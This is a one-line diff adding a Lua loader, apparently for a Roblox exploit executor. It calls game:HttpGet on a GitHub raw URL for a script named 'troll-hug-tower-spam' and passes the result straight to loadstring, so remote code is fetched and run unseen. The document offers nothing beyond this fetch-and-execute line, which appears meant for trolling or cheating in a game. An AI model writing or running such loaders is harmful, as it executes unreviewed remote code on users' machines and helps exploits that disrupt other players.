@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/troll-hug-tower-spam0-1shzkqvvigf6yh.lua"))()
